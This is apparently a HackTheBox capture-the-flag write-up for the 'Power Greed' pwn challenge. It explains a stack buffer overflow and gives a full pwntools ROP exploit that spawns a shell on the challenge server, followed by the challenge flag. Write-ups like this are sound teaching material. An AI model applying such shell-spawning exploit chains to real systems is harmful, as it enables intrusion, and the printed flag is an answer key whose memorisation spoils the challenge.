---
title: "Power Greed"
ctf: "HackTheBox"
date: 2026-06-02
category: pwn
difficulty: very-easy
points: 0
flag_format: "HTB{...}"
author: "gluppler"
---

# Power Greed

## Summary

Statically linked x86-64 binary with a stack buffer overflow in `vuln_scan()`. The function was compiled without `-fstack-protector` (no canary), despite `checksec` reporting "Canary found" from the linked libc. Exploited via a ROP chain calling `execve("/bin/sh", 0, 0)` through a raw `syscall` gadget.

## Solution

### Step 1: Identify the vulnerability

`vuln_scan()` at `0x401dea` calls `read(0, buf, 0xae)` into a 32-byte stack buffer with no canary check. Offset to return address is `0x38`.

Menu path: Main → `1. Diagnostics Center` → `1. Vulnerability scan` → `y`.

### Step 2: Build the ROP chain

Binary is statically linked with no `system()`/`execve()` — must use `execve` syscall directly. Gadgets found in the binary:

| Gadget | Address |
|--------|---------|
| `pop rdi; pop rbp; ret` | `0x402bd8` |
| `pop rsi; pop rbp; ret` | `0x40c002` |
| `pop rdx; xor eax,eax; pop rbx; pop r12; pop r13; pop rbp; ret` | `0x46f4dc` |
| `pop rax; ret` | `0x42adab` |
| `syscall` | `0x40141a` |
| `/bin/sh` | `0x481778` |

```python
from pwn import *

context.arch = 'amd64'
host, port = '154.57.164.66', 32084

p = remote(host, port)

pop_rax_ret = 0x42adab
pop_rdi_pop_rbp_ret = 0x402bd8
pop_rsi_pop_rbp_ret = 0x40c002
pop_rdx_pop = 0x46f4dc
syscall = 0x40141a
bin_sh = 0x481778

p.recvuntil(b'> '); p.sendline(b'1')
p.recvuntil(b'> '); p.sendline(b'1')
p.recvuntil(b'(y/n): '); p.sendline(b'y')
p.recvuntil(b'buffer: ')

payload = b'A' * 0x38
payload += p64(pop_rdi_pop_rbp_ret) + p64(bin_sh) + p64(0)
payload += p64(pop_rsi_pop_rbp_ret) + p64(0) + p64(0)
payload += p64(pop_rdx_pop) + p64(0)*5
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall)

p.send(payload)
p.interactive()
```

## Flag

```
HTB{p0w3R_g41d_r34ct1on}
```
